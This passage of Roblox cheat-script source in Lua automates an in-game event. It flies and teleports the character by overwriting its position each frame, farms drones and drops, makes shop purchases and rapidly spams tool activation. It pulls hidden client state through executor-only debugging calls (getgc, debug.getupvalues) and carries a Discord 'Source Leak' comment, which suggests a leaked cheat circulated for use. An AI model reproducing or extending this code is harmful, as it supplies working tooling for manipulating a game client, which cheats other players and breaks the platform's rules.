				str28 = "Coming back through the safe zone"
				func293(result59, callback13, 4)
			end
		end
	end

	local func297, func298, func299

	do
		local function func300(callback14)
			if func284() then
				return true
			end
			local Entry = func282("Entry")
			local num92 = func283(Entry, Vector3.new(2125.7, 73.1, -295.4))
			str28 = "Flying to the Secret Cave"
			if not func293(num92, callback14, 6) then
				return false
			end

			for i = 1, 4 do
				if callback14() then
					return false
				end
				str28 = "Entering the Secret Cave"
				func281(Entry or func282("Entry"))
				local n13 = os.clock() + 1.5

				while os.clock() < n13 and not func284() do
					RunService.Heartbeat:Wait()
				end

				if func284() then
					return true
				end
			end

			str28 = "Cave door missed, flying in"
			local quest = type(snapshot) == "table" and snapshot.Quest or nil
			local position = type(quest) == "table" and type(quest.EscapedExperiment) == "table" and quest.EscapedExperiment.Position or nil

			if typeof(position) == "Vector3" then
				pcall(str1.FlyTo, position, callback14, "scramble")
			end

			return func284()
		end

		local function func301(childName11)
			local quest = type(snapshot) == "table" and snapshot.Quest or nil
			local flag374 = type(quest) == "table" and quest[childName11] or nil
			local position = type(flag374) == "table" and flag374.Position or nil
			if typeof(position) == "Vector3" then
				return position
			end
			local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
			local obj42 = drScrambleEvent and drScrambleEvent:FindFirstChild(childName11)
			if obj42 and obj42:IsA("Model") then
				return obj42:GetPivot().Position
			end
			return nil
		end

		local function func302(param188)
			local value277 = snapshot
			local interactions = type(value277) == "table" and value277.Interactions or nil
			return math.max(4, (type(interactions) == "table" and tonumber(interactions[param188]) or 12) - 4)
		end

		func297 = function(param189)
			local result60 = func273()
			if not result60 or result60.Discovered == true then
				return true
			end
			local EscapedExperiment = func301("EscapedExperiment")
			if not EscapedExperiment or not func300(param189) then
				return false
			end
			str28 = "Talking to the Escaped Experiment"
			if not func280(EscapedExperiment, param189, func302("NpcRadius")) then
				return false
			end
			local Discover = scrambleRequest("Discover")
			scrambleRead(true)
			return Discover ~= nil and func273() ~= nil and func273().Discovered == true
		end

		func298 = function(callback15)
			local result61 = func273()
			local flag375 = not result61 or result61.Completed == true

			if not flag375 then
				local n13 = #list37
				flag375 = func277(result61) >= n13
			end

			if flag375 then
				return
			end

			if result61.Discovered ~= true and not func297(callback15) then
				return
			end

			for _, item90 in ipairs(list37) do
				if callback15() then
					return
				end

				if not func276(func273(), item90) then
					local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
					drScrambleEvent = drScrambleEvent and drScrambleEvent:FindFirstChild(item90)
					drScrambleEvent = drScrambleEvent and drScrambleEvent:FindFirstChild("Hitbox", true)
					local claimLostPart = drScrambleEvent and drScrambleEvent:FindFirstChild("ClaimLostPart", true)
					local position = drScrambleEvent and drScrambleEvent:IsA("BasePart") and drScrambleEvent.Position or func301(item90)

					if position then
						str28 = "Flying to " .. (item90 == "LostPart1" and "Lost Part 1" or "Lost Part 2")

						if func293(position + Vector3.new(0, 2, 0), callback15, 3) then
							str28 = "Collecting the lost part"
							local n13 = position + Vector3.new(0, 2.5, 0)
							local character = localPlayer.Character
							str1.Shield("scramble", true)
							str1.Driving = str1.Driving + 1

							local connection2 = RunService.Heartbeat:Connect(function()
								local flag376 = str1.Root()
								if not flag376 or flag376.Parent ~= character or str1.AntiGuard.Busy or str1.Movement.Owner ~= "scramble" then
									return
								end

								pcall(function()
									local rotation = flag376.CFrame.Rotation
									flag376.CFrame = CFrame.new(n13) * rotation
									flag376.AssemblyLinearVelocity = Vector3.zero
									flag376.AssemblyAngularVelocity = Vector3.zero
								end)
							end)

							for i = 1, 4 do
								if not callback15() then
									claimLostPart = claimLostPart or drScrambleEvent and drScrambleEvent:FindFirstChild("ClaimLostPart", true)
									func281(claimLostPart)
									task.wait(0.6)
									scrambleRead(true)
									if not func276(func273(), item90) then
										continue
									end
								end

								break
							end

							connection2:Disconnect()
							str1.Driving = math.max(0, str1.Driving - 1)
							str1.Shield("scramble", false)
							if callback15() then
								return
							end
							continue
						end
					end
				end
			end
		end

		func299 = function(param190)
			local result62 = func273()
			if not result62 or result62.Completed == true then
				return
			end
			local totalParts = tonumber(result62.TotalParts)

			if not totalParts then
				totalParts = func277(result62) + (tonumber(result62.DroneParts) or 0)
			end

			if totalParts < 5 then
				return
			end
			local ExperimentVault = func301("ExperimentVault")
			if not ExperimentVault or not func300(param190) then
				return
			end
			str28 = "Opening the Experiment Vault"
			if not func280(ExperimentVault, param190, func302("VaultRadius")) then
				return
			end
			scrambleRequest("Vault")
			scrambleRead(true)
			local result63 = func273()

			if result63 and result63.Completed == true then
				str28 = "Vault opened, The Scrambler unlocked"
			end
		end
	end

	local func303

	func303 = function()
		local function func304(instance14)
			if not instance14 or not instance14:IsA("Tool") then
				return false
			end

			if tostring(instance14:GetAttribute("ItemType")) ~= "MutationConsumable" then
				return false
			end
			local attribute = instance14:GetAttribute("MutationId") or instance14:GetAttribute("MutationTemplate")
			if attribute ~= nil then
				return tostring(attribute) == "Scrambled"
			end
			return string.find(string.lower(instance14.Name), "scrambled", 1, true) ~= nil
		end

		local character = localPlayer.Character

		if character then
			for _, child in ipairs(character:GetChildren()) do
				if func304(child) then
					return child, true
				end
			end
		end

		local backpack = localPlayer:FindFirstChildOfClass("Backpack")

		if backpack then
			for _, child in ipairs(backpack:GetChildren()) do
				if func304(child) then
					return child, false
				end
			end
		end

		return nil, false
	end

	local func305

	func305 = function(param191, param192)
		local shopPurchases = type(param191) == "table" and param191.ShopPurchases or nil
		local flag377 = type(shopPurchases) == "table" and shopPurchases[param192.Id] or nil
		if type(flag377) ~= "table" then
			return 0
		end
		local shopPeriod = type(snapshot) == "table" and snapshot.ShopPeriod or nil
		if flag377.Period ~= nil and shopPeriod ~= nil and flag377.Period ~= shopPeriod then
			return 0
		end
		return tonumber(flag377.Count) or 0
	end

	local func306

	func306 = function(callback16)
		local value278 = scrambleRead(true)
		if type(value278) ~= "table" or type(value278.Shop) ~= "table" then
			return
		end

		for _, item91 in ipairs(tbl210) do
			if callback16() then
				return
			end

			if tbl213.Picked[item91.Label] == true then
				for i = 1, 10 do
					local value279 = snapshot
					local result64 = func273()
					local func307 = ipairs
					local shop = type(value279) == "table" and value279.Shop or {}
					local value280 = nil

					for _, value281 in func307(shop) do
						if type(value281) == "table" and value281.Id == item91.Id then
							value280 = value281
						end
					end

					if not (not value280 or not result64 or callback16()) then
						local purchaseLimit = tonumber(value280.PurchaseLimit)

						if not (purchaseLimit and func305(result64, value280) >= purchaseLimit) then
							if not ((tonumber(result64.Samples) or 0) - (tonumber(value280.Price) or math.huge) < tbl213.Keep) then
								local Shop = scrambleRequest("Shop", value280.Id, { Quote = value280.Quote, Sequence = tonumber(result64.ShopSequence) or 0 })

								if not (type(Shop) ~= "table" or Shop.Ok ~= true) then
									str28 = "Bought " .. item91.Label
									task.wait(0.4)
									continue
								end
							end
						end
					end

					break
				end
			end
		end
	end

	local n13, n14, n15, tbl214, tbl215, flag378, n16, n17, n18, n19
	local func308, func309, value282, func310, func311, func312, func313

	do
		local n20 = 98
		n13 = 12
		n14 = 20
		n15 = 3

		tbl214 = {
			Vector3.new(2000, 90, -360),
			Vector3.new(2700, 90, -370),
			Vector3.new(3400, 90, -365),
			Vector3.new(4100, 90, -360),
			Vector3.new(4800, 90, -370),
			Vector3.new(5500, 90, -360),
			Vector3.new(5900, 90, -365),
		}

		tbl215 = {}
		local tbl216 = { Link = nil, Goal = nil, Look = nil, Character = nil }
		local userId = localPlayer.UserId
		local list40 = {}

		for _, item92 in ipairs({
			{ Label = "Scrap Drone", Tier = "ScrapDrone" },
			{ Label = "Reactor Drone", Tier = "ReactorDrone" },
			{ Label = "Augmented Drone", Tier = "AugmentedDrone" },
		}) do
			list40[#list40 + 1] = item92.Label
		end

		local tbl217 = { ScrapDrone = true, ReactorDrone = true, AugmentedDrone = true }
		local value283 = ({ "Nearest", "Rare First", "Most HP First" })[1]
		flag378 = ({ "Tween", "Teleport" })[1]
		n16 = 110
		n17 = 1.5
		n18 = 0
		n19 = -math.huge

		local function func314(param193)
			local flag379 = type(param193) == "table" and tonumber(param193.OwnerUserId) or nil
			return flag379 == nil or flag379 == userId
		end

		local function func315(part17)
			if typeof(part17) == "CFrame" then
				return part17.Position
			end

			if typeof(part17) == "Vector3" then
				return part17
			end
			return nil
		end

		local function func316(childName12, param194)
			local obj43 = networking:FindFirstChild(childName12)
			if not obj43 or not obj43:IsA("RemoteEvent") then
				return
			end

			local connection2 = obj43.OnClientEvent:Connect(function(...)
				pcall(param194, ...)
			end)

			func4(function()
				pcall(function()
					connection2:Disconnect()
				end)
			end)
		end

		func316("RE/Scramble/Drones", function(param195)
			if type(param195) ~= "table" then
				return
			end
			local func317 = pairs
			local upserts = type(param195.Upserts) == "table" and param195.Upserts or {}

			for _, upsert in func317(upserts) do
				if type(upsert) == "table" and upsert.Id ~= nil and func314(upsert) then
					local id = tostring(upsert.Id)
					local attributes = type(upsert.Attributes) == "table" and upsert.Attributes or {}
					local tbl218 = tbl211[id] or {}
					tbl218.Id = id
					tbl218.Position = func315(upsert.CFrame) or tbl218.Position
					tbl218.Health = tonumber(upsert.Health) or tbl218.Health or 1
					tbl218.Tier = tostring(attributes.ScrambleTier or tbl218.Tier or "")
					tbl218.Area = tostring(attributes.ScrambleArea or tbl218.Area or "")
					tbl218.Seen = os.clock()
					tbl211[id] = tbl218
				end
			end

			local func318 = pairs
			local removed = type(param195.Removed) == "table" and param195.Removed or {}

			for k, value284 in func318(removed) do
				tbl211[tostring(type(value284) == "string" and value284 or k)] = nil
			end
		end)

		func316("RE/Scramble/Effect", function(flag380, param196, param197)
			if flag380 ~= "Hit" or type(param197) ~= "table" or param197.DroneId == nil then
				return
			end
			local entry15 = tbl211[tostring(param197.DroneId)]
			if not entry15 then
				return
			end
			entry15.Position = func315(param196) or entry15.Position
			entry15.Health = (tonumber(entry15.Health) or 1) - (tonumber(param197.Amount) or 1)

			if type(param197.Motion) == "string" and string.find(param197.Motion, "\"Death\"", 1, true) then
				entry15.Health = 0
			end

			if entry15.Health <= 0 then
				tbl211[entry15.Id] = nil
			end
		end)

		func316("RE/Scramble/Drops", function(flag381)
			local func319 = pairs
			flag381 = type(flag381) == "table" and flag381 or {}

			for _, value285 in func319(flag381) do
				if type(value285) == "table" and value285.Id ~= nil and func314(value285) then
					local position5 = func315(value285.Position) or func315(value285.Origin)

					if position5 then
						tbl212[tostring(value285.Id)] = {
							Position = position5,
							Radius = tonumber(value285.Radius) or 6,
							ExpiresAt = tonumber(value285.ExpiresAt),
							Kind = value285.Kind,
						}
					end
				end
			end
		end)

		func316("RE/Scramble/State", function(list41)
			if type(list41) ~= "table" then
				return
			end

			if list41.Patch == true and type(snapshot) == "table" then
				for k, value286 in pairs(list41) do
					if k ~= "Patch" then
						snapshot[k] = value286
					end
				end
			elseif type(list41.State) == "table" then
				snapshot = list41
			end

			n8 = os.clock()
		end)

		func316("RE/Scramble/RemoveDrops", function(flag382)
			local func320 = pairs
			flag382 = type(flag382) == "table" and flag382 or {}

			for k, value287 in func320(flag382) do
				local tbl219 = tbl212
				local func321 = tostring
				value287 = type(value287) == "string" and value287 or k
				tbl219[func321(value287)] = nil
			end
		end)

		local function func322(str30)
			local scrambleLocalVisuals = workspace:FindFirstChild("ScrambleLocalVisuals")
			return scrambleLocalVisuals and scrambleLocalVisuals:FindFirstChild("PersonalDrone_" .. str30) or nil
		end

		local value288 = nil
		local n21 = 0

		local function func323()
			if value288 and next(value288) ~= nil then
				return value288
			end
			value288 = nil
			if os.clock() < n21 or type(getgc) ~= "function" or not func275() then
				return nil
			end
			n21 = os.clock() + 15

			for _, item93 in ipairs(getgc(false)) do
				if type(item93) == "function" and islclosure(item93) then
					local ok, result = pcall(debug.info, item93, "s")

					if ok and type(result) == "string" and string.find(result, "PersonalDrones", 1, true) then
						local ok2, result2 = pcall(debug.getupvalues, item93)

						if ok2 and type(result2) == "table" then
							for _, value289 in pairs(result2) do
								if type(value289) ~= "table" then
									continue
								end
								local key, value290 = next(value289)
								if type(value290) == "table" and value290.OwnerUserId ~= nil and value290.CFrame ~= nil then
									value288 = value289
									return value289
								end
							end

							continue
						end
					end
				end
			end

			return nil
		end

		local function func324()
			local result65 = func323()
			if not result65 then
				return
			end

			for k, value291 in pairs(result65) do
				if type(value291) == "table" and func314(value291) then
					local str31 = tostring(value291.Id or k)
					local attributes = type(value291.Attributes) == "table" and value291.Attributes or {}
					local entry16 = tbl211[str31]
					local health2 = tonumber(value291.Health)

					if not entry16 then
						entry16 = { Id = str31, Health = health2 or 1 }
						tbl211[str31] = entry16
					elseif health2 then
						entry16.Health = math.min(health2, tonumber(entry16.Health) or health2)
					end

					entry16.Position = func315(value291.CFrame) or entry16.Position
					entry16.Tier = tostring(attributes.ScrambleTier or entry16.Tier or "")
					entry16.Area = tostring(attributes.ScrambleArea or entry16.Area or "")

					if attributes.DroneState == "Death" then
						entry16.Health = 0
					end
				end
			end

			for k in pairs(tbl211) do
				if result65[k] == nil then
					tbl211[k] = nil
				end
			end
		end

		func308 = function()
			pcall(func324)
			local scrambleLocalVisuals = workspace:FindFirstChild("ScrambleLocalVisuals")
			if not scrambleLocalVisuals then
				return
			end

			for _, child in ipairs(scrambleLocalVisuals:GetChildren()) do
				local attribute = child:GetAttribute("ScrambleDroneId")

				if child:IsA("Model") and attribute ~= nil and string.sub(child.Name, 1, 14) == "PersonalDrone_" then
					local str32 = tostring(attribute)

					if child:GetAttribute("DroneState") == "Death" then
						tbl211[str32] = nil
					elseif not tbl211[str32] then
						local ok, result = pcall(child.GetPivot, child)

						tbl211[str32] = {
							Id = str32,
							Position = ok and result.Position or nil,
							Health = tonumber(child:GetAttribute("Health")) or 1,
							Tier = tostring(child:GetAttribute("ScrambleTier") or ""),
							Area = tostring(child:GetAttribute("ScrambleArea") or ""),
							Seen = os.clock(),
						}
					end
				end
			end
		end

		local function func325(part18)
			local id2 = func322(part18.Id)
			local hitbox = id2 and id2:FindFirstChild("Hitbox")
			if hitbox and hitbox:IsA("BasePart") then
				return hitbox.Position
			end

			if id2 and id2.PrimaryPart then
				return id2.PrimaryPart.Position
			end
			return part18.Position
		end

		local function func326()
			local list42 = {}
			local now = os.clock()

			for k, value292 in pairs(tbl211) do
				local tier = value292.Tier == nil or value292.Tier == "" or tbl217[value292.Tier] == true

				if tier then
					tier = (tonumber(value292.Health) or 0) > 0
				end

				local position = tier and value292.Position

				if position then
					position = (tbl215[k] or 0) <= now
				end

				if position then
					list42[#list42 + 1] = value292
				end
			end

			return list42
		end

		local function func327()
			local result66 = func279()
			if not result66 then
				return nil
			end
			local huge = math.huge
			local value293 = nil

			for _, item94 in ipairs(func326()) do
				local magnitude = ((func325(item94) or item94.Position) - result66.Position).Magnitude
				local flag383 = value283

				if flag383 == "Rare First" then
					if item94.Tier == "AugmentedDrone" then
						magnitude -= 200000
					elseif item94.Tier == "ReactorDrone" then
						magnitude -= 100000
					end
				elseif flag383 == "Most HP First" then
					magnitude -= (tonumber(item94.Health) or 0) * 100000
				end

				if magnitude < huge then
					huge = magnitude
					value293 = item94
				end
			end

			return value293
		end

		local function func328()
			local result67 = func279()
			if not result67 then
				return nil, nil
			end
			local serverTimeNow = workspace:GetServerTimeNow()
			local huge = math.huge
			local value294 = nil
			local value295 = nil

			for k, value296 in pairs(tbl212) do
				if value296.ExpiresAt and value296.ExpiresAt < serverTimeNow then
					tbl212[k] = nil
				else
					local magnitude = (value296.Position - result67.Position).Magnitude

					if value296.Kind == "Part" then
						magnitude -= 100000
					end

					if magnitude < huge then
						huge = magnitude
						value294 = k
						value295 = value296
					end
				end
			end

			return value294, value295
		end

		func309 = function()
			if not tbl216.Link then
				if tbl216.SwapWait then
					tbl216.SwapWait = nil
					str1.Shield("scramble", false)
				end

				return
			end

			tbl216.Link:Disconnect()
			local value297 = tbl216
			local value298 = tbl216
			local value299 = tbl216
			tbl216.Link = nil
			value297.Goal = nil
			value298.Look = nil
			value299.Character = nil
			local value300 = tbl216
			local value301 = tbl216
			local value302 = tbl216
			local value303 = tbl216
			tbl216.Track = nil
			value300.Dir = nil
			value301.Last = nil
			value302.LastAt = nil
			value303.Vel = nil
			str1.Driving = math.max(0, str1.Driving - 1)
			str1.Shield("scramble", false)
		end

		func4(func309)

		local function func329(goal, look, track)
			if track ~= tbl216.Track then
				local value304 = tbl216
				local value305 = tbl216
				tbl216.Last = nil
				value304.LastAt = nil
				value305.Vel = nil
			end

			local value306 = tbl216
			local value307 = tbl216
			tbl216.Goal = goal
			value306.Look = look
			value307.Track = track
			local character = localPlayer.Character

			if tbl216.Link and tbl216.Character ~= character then
				func309()
				local value308 = tbl216
				local value309 = tbl216
				tbl216.Goal = goal
				value308.Look = look
				value309.Track = track
			end

			if tbl216.Link or not character then
				return
			end

			if not str1.Swapped() then
				str1.Shield("scramble", true)
				tbl216.SwapWait = tbl216.SwapWait or os.clock() + 6
				local swapWait = tbl216.SwapWait
				if os.clock() < swapWait then
					str28 = "Waiting for the character to settle"
					return
				end
			end

			if tbl216.SwapWait then
				tbl216.SwapWait = nil
			else
				str1.Shield("scramble", true)
			end

			tbl216.Character = character
			str1.Driving = str1.Driving + 1

			tbl216.Link = RunService.Heartbeat:Connect(function(deltaTime)
				local flag384 = str1.Root()
				local goal2 = tbl216.Goal
				if not flag384 or not goal2 or flag384.Parent ~= tbl216.Character or str1.AntiGuard.Busy or str1.Movement.Owner ~= "scramble" then
					return
				end
				local position = flag384.Position

				if tbl216.Track then
					local ok, last = pcall(tbl216.Track)

					if ok and typeof(last) == "Vector3" then
						local now = os.clock()

						if not tbl216.Last or not tbl216.LastAt then
							local value310 = tbl216
							tbl216.Last = last
							value310.LastAt = now
						elseif (last - tbl216.Last).Magnitude > 0.01 then
							local n22 = math.max(now - tbl216.LastAt, 0.0041666666666666666)
							local n23 = (last - tbl216.Last) / n22

							if n23.Magnitude < 400 then
								local n24 = math.clamp(n22 * 12, 0.2, 0.8)
								tbl216.Vel = tbl216.Vel and tbl216.Vel:Lerp(n23, n24) or n23
							end

							local value311 = tbl216
							tbl216.Last = last
							value311.LastAt = now
						elseif now - tbl216.LastAt > 0.25 and tbl216.Vel then
							tbl216.Vel = tbl216.Vel:Lerp(Vector3.zero, math.clamp(deltaTime * 6, 0, 1))
						end

						local vel = tbl216.Vel or Vector3.zero
						local look2 = tbl216.Last + vel * (math.clamp(now - tbl216.LastAt, 0, 0.25) + 0.1)
						local vector = Vector3.new(position.X - look2.X, 0, position.Z - look2.Z)

						if vector.Magnitude > 0.5 then
							local unit = vector.Unit
							local n22 = math.clamp(deltaTime * 5, 0, 1)
							local dir = tbl216.Dir and tbl216.Dir:Lerp(unit, n22) or unit
							tbl216.Dir = dir.Magnitude > 0.01 and dir.Unit or unit
						end

						goal2 = look2 + (tbl216.Dir or Vector3.new(0, 0, 1)) * n11 + Vector3.new(0, -1, 0)
						local value312 = tbl216
						tbl216.Goal = goal2
						value312.Look = look2

						if (goal2 - position).Magnitude <= 40 then
							local n22 = math.max(deltaTime, 0.0041666666666666666)
							local n23 = vel + (goal2 - position) / math.max(0.1, n22)
							local n24 = math.max(400, vel.Magnitude + 80)

							if n24 < n23.Magnitude then
								n23 = n23.Unit * n24
							end

							local assemblyLinearVelocity = n23 + Vector3.new(0, workspace.Gravity * n22 * 0.5, 0)
							local vector2 = Vector3.new(look2.X - position.X, 0, look2.Z - position.Z)

							pcall(function()
								if vector2.Magnitude > 0.05 then
									flag384.CFrame = CFrame.lookAt(position, position + vector2.Unit)
								end

								flag384.AssemblyLinearVelocity = assemblyLinearVelocity
								flag384.AssemblyAngularVelocity = Vector3.zero
							end)

							return
						end
					end
				end

				local vector

				if not (Vector3.new(goal2.X - position.X, 0, goal2.Z - position.Z).Magnitude > 250) then
					vector = goal2
				else
					local n22 = math.max(n20, goal2.Y)
					vector = position.Y < n22 - 2 and Vector3.new(position.X, n22, position.Z) or Vector3.new(goal2.X, n22, goal2.Z)
				end

				local n22 = vector - position
				local n23 = n7 * deltaTime
				local n24 = n22.Magnitude <= n23 and vector or position + n22.Unit * n23
				goal2 = tbl216.Look or goal2
				local vector2 = Vector3.new(goal2.X - n24.X, 0, goal2.Z - n24.Z)
				local cframe = vector2.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector2.Unit) or flag384.CFrame.Rotation

				pcall(function()
					flag384.CFrame = CFrame.new(n24) * cframe
					flag384.AssemblyLinearVelocity = Vector3.zero
					flag384.AssemblyAngularVelocity = Vector3.zero
				end)
			end)
		end

		local function func330(instance15)
			if typeof(instance15) ~= "Instance" or not instance15:IsA("Tool") then
				return false
			end
			local attribute = instance15:GetAttribute("GearName")
			local gears = tbl1.Gears
			local directory = type(gears) == "table" and gears.Directory or nil
			local flag385 = type(attribute) == "string" and type(directory) == "table" and directory[attribute] or nil
			return type(flag385) == "table" and (flag385.ToolController == "Slap" or flag385.SlapPower ~= nil)
		end

		local function func331(instance16)
			if typeof(instance16) ~= "Instance" or not instance16:IsA("Tool") then
				return false
			end

			if tostring(instance16:GetAttribute("ItemType")) ~= "Gear" then
				return false
			end
			local str33 = tostring(instance16:GetAttribute("GearName") or "")
			if str33 == "" then
				return false
			end
			return string.find(string.lower(str33), "scrambler", 1, true) ~= nil
		end

		local function func332()
			return localPlayer.Character, localPlayer:FindFirstChildOfClass("Backpack")
		end

		local function func333()
			local value313 = str1.FindBat()
			if value313 then
				return value313
			end
			local value314, value315 = func332()

			for _, item95 in ipairs({ value314, value315 }) do
				if item95 then
					for _, child in ipairs(item95:GetChildren()) do
						if func330(child) or func331(child) then
							return child
						end
					end
				end
			end

			return nil
		end

		flag359.Valid = function(instance17)
			if typeof(instance17) ~= "Instance" or not instance17:IsA("Tool") then
				return false
			end
			return str1.IsBatTool(instance17) or func330(instance17) or func331(instance17)
		end

		flag359.Owned = function(obj)
			if typeof(obj) ~= "Instance" or not obj:IsA("Tool") then
				return false
			end
			local flag386, value316 = func332()
			local parent = obj.Parent
			return parent ~= nil and (parent == flag386 or parent == value316)
		end

		flag359.Name = function(obj)
			if func331(obj) then
				return "The Scrambler"
			end
			return tostring(obj:GetAttribute("GearName") or obj.Name)
		end

		flag359.Put = function(obj, obj44, parent)
			local equipAt = flag359.EquipAt
			if os.clock() - equipAt < 0.4 then
				return false
			end
			flag359.EquipAt = os.clock()

			pcall(function()
				obj44:EquipTool(obj)
			end)

			if obj.Parent ~= parent then
				pcall(function()
					obj.Parent = parent
				end)
			end

			return obj.Parent == parent
		end

		local function func334()
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
			if not character or not humanoid or humanoid.Health <= 0 then
				return nil, false
			end
			local tool = character:FindFirstChildWhichIsA("Tool")

			if tool ~= nil and flag359.Valid(tool) then
				flag359.Tool = tool
				str29 = flag359.Name(tool)
				return tool, true
			end

			if not flag359.Owned(flag359.Tool) then
				flag359.Tool = func333()
			end

			local tool2 = flag359.Tool
			if not tool2 then
				str29 = ""
				return nil, false
			end
			str29 = flag359.Name(tool2)
			flag359.Put(tool2, humanoid, character)
			return tool2, tool2.Parent == character
		end

		local function func335()
			local obj45, value317 = func334()

			if obj45 and value317 then
				if flag360 then
					pcall(function()
						obj45:Activate()
					end)

					task.defer(function()
						pcall(function()
							obj45:Deactivate()
						end)
					end)
				else
					pcall(function()
						obj45:Deactivate()
						obj45:Activate()
					end)
				end
			end

			return obj45 ~= nil
		end

		local function func336()
			local value318, value319 = func332()
			local value320 = nil
			local value321 = nil
			local value322 = nil

			for _, item96 in ipairs({ value318, value319 }) do
				if item96 then
					for _, child in ipairs(item96:GetChildren()) do
						if flag359.Valid(child) then
							if func331(child) then
								value320 = value320 or child
							elseif str1.IsBatTool(child) and (value321 == nil or not str1.IsBatTool(value321)) then
								if value322 then
									value321 = child
								else
									value322 = value321
									value321 = child
								end
							elseif value321 == nil then
								value321 = child
							elseif value322 == nil then
								value322 = child
							end
						end
					end
				end
			end

			return value321, value320 or value322
		end

		local function func337(obj46)
			pcall(function()
				obj46:Activate()
			end)

			task.defer(function()
				pcall(function()
					obj46:Deactivate()
				end)
			end)
		end

		list39.SpamUntil = 0
		list39.List = {}
		list39.Dirty = true
		list39.BuiltAt = 0
		list39.NextBag = 0
		list39.Links = {}

		list39.Click = function(obj)
			pcall(obj.Deactivate, obj)
			pcall(obj.Activate, obj)
		end

		list39.Rebuild = function()
			list39.Dirty = false
			list39.BuiltAt = os.clock()
			table.clear(list39.List)
			local value323, value324 = func332()

			for _, item97 in ipairs({ value323, value324 }) do
				if item97 then
					for _, child in ipairs(item97:GetChildren()) do
						if flag359.Valid(child) then
							list39.List[#list39.List + 1] = child
						end
					end
				end
			end
		end

		list39.Beat = RunService.Heartbeat:Connect(function()
			local now = os.clock()
			if list39.SpamUntil <= now then
				return
			end

			if list39.Dirty or now - list39.BuiltAt > 1 then
				list39.Rebuild()
			end
			-- https://discord.gg/x7YbZeezpm | S​L​ ​|​ ​S​o​u​r​c​e​ ​L​e​a​k

			local character = localPlayer.Character
			local flag387 = now >= list39.NextBag

			if flag387 then
				list39.NextBag = now + 0.25
			end

			for _, item98 in ipairs(list39.List) do
				local parent = item98.Parent

				if parent == character then
					list39.Click(item98)
				elseif flag387 and parent ~= nil then
					list39.Click(item98)
				end
			end
		end)

		list39.Unwatch = function()
			for i = #list39.Links, 1, -1 do
				pcall(function()
					list39.Links[i]:Disconnect()
				end)

				list39.Links[i] = nil
			end
		end

		list39.Watch = function(obj)
			list39.Unwatch()
			list39.Dirty = true
			if not obj then
				return
			end

			list39.Links[#list39.Links + 1] = obj.ChildAdded:Connect(function(child)
				if not child:IsA("Tool") then
					return
				end
				list39.Dirty = true
				local spamUntil = list39.SpamUntil

				if os.clock() < spamUntil and flag359.Valid(child) then
					list39.Click(child)
					task.defer(list39.Click, child)
				end
			end)

			list39.Links[#list39.Links + 1] = obj.ChildRemoved:Connect(function(child)
				if child:IsA("Tool") then
					list39.Dirty = true
				end
			end)

			task.defer(function()
				local backpack = localPlayer:FindFirstChildOfClass("Backpack") or localPlayer:WaitForChild("Backpack", 5)

				if backpack and localPlayer.Character == obj then
					list39.Links[#list39.Links + 1] = backpack.ChildAdded:Connect(function()
						list39.Dirty = true
					end)

					list39.Links[#list39.Links + 1] = backpack.ChildRemoved:Connect(function()
						list39.Dirty = true
					end)
				end
			end)
		end

		list39.Watch(localPlayer.Character)
		list39.CharLink = localPlayer.CharacterAdded:Connect(list39.Watch)

		func4(function()
			list39.SpamUntil = 0
			list39.Unwatch()

			for _, item99 in ipairs({ "Beat", "CharLink" }) do
				if list39[item99] then
					pcall(function()
						list39[item99]:Disconnect()
					end)

					list39[item99] = nil
				end
			end
		end)

		local function func338()
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
			if not character or not humanoid or humanoid.Health <= 0 then
				return false
			end
			local flag388, flag389 = func336()
			if not flag388 or not flag389 then
				return func335()
			end
			local tbl220 = { flag388, flag389 }
			local tbl221 = { 0.3, 0.4 }
			local entry17 = tbl220[list39.Index]

			if list39.Tool ~= entry17 then
				local value325 = list39
				local value326 = list39
				local now = os.clock()
				value325.Tool = entry17
				value326.Since = now
			end

			local parent3 = entry17.Parent == character

			if parent3 then
				local since = list39.Since
				parent3 = os.clock() - since >= tbl221[list39.Index]
			end

			if parent3 then
				list39.Index = list39.Index == 1 and 2 or 1
				entry17 = tbl220[list39.Index]
				local value327 = list39
				local value328 = list39
				local now = os.clock()
				value327.Tool = entry17
				value328.Since = now
			end

			flag359.Tool = entry17
			str29 = flag359.Name(entry17)

			if entry17.Parent ~= character then
				pcall(function()
					humanoid:EquipTool(entry17)
				end)

				if entry17.Parent ~= character then
					pcall(function()
						entry17.Parent = character
					end)
				end

				list39.Since = os.clock()

				if entry17.Parent == character then
					func337(entry17)
					task.defer(func337, entry17)
				end

				return true
			end

			func337(entry17)
			return true
		end

		local function func339(callback17, num93, flag390)
			local now = os.clock()
			local n22 = now + n15

			while os.clock() < n22 and not callback17() do
				local value329, flag391 = func328()
				local flag392 = not flag391

				if not flag392 then
					if num93 then
						flag392 = (flag391.Position - num93).Magnitude > (flag390 or 40)
					else
						flag392 = num93
					end
				end

				if flag392 then
					if num93 and os.clock() - now < 1.2 then
						task.wait(0.1)
						continue
					end
					return
				end

				if func288() and not func288(flag391.Position) then
					func309()
					str28 = "Leaving the base through the safe zone"
					if not func293(flag391.Position + Vector3.new(0, 2.5, 0), callback17, 6) then
						return
					end
					continue
				end

				str28 = flag391.Kind == "Part" and "Picking up a Drone Part" or "Picking up Samples"
				func329(flag391.Position + Vector3.new(0, 2.5, 0), flag391.Position)
				local n23 = os.clock() + 2.5

				while tbl212[value329] and os.clock() < n23 and not callback17() do
					task.wait(0.1)
				end

				tbl212[value329] = nil
				n22 = os.clock() + 1.2
			end
		end

		local function func340(humanoid3, callback18)
			local now = os.clock()
			local n22 = tonumber(humanoid3.Health) or 0
			local value330 = nil
			local now2 = nil
			local value331 = nil
			local flag393 = false

			while not callback18() do
				local entry18 = tbl211[humanoid3.Id]
				local flag394 = not entry18

				if not flag394 then
					flag394 = (tonumber(entry18.Health) or 0) <= 0
				end

				if flag394 then
					return true
				end
				local id3 = func322(humanoid3.Id)
				if id3 and id3:GetAttribute("DroneState") == "Death" then
					tbl211[humanoid3.Id] = nil
					return true
				end
				local result68 = func279()
				local flag395 = result68 ~= nil and entry18.Position ~= nil

				if flag395 then
					flag395 = (result68.Position - (func325(entry18) or entry18.Position)).Magnitude <= 30
				end

				if flag395 and not id3 then
					local now3 = value330 or os.clock()
					if os.clock() - now3 > 1.5 then
						tbl211[humanoid3.Id] = nil
						return false
					end
					value330 = now3
				else
					value330 = nil
				end

				local n23 = tonumber(entry18.Health) or 0

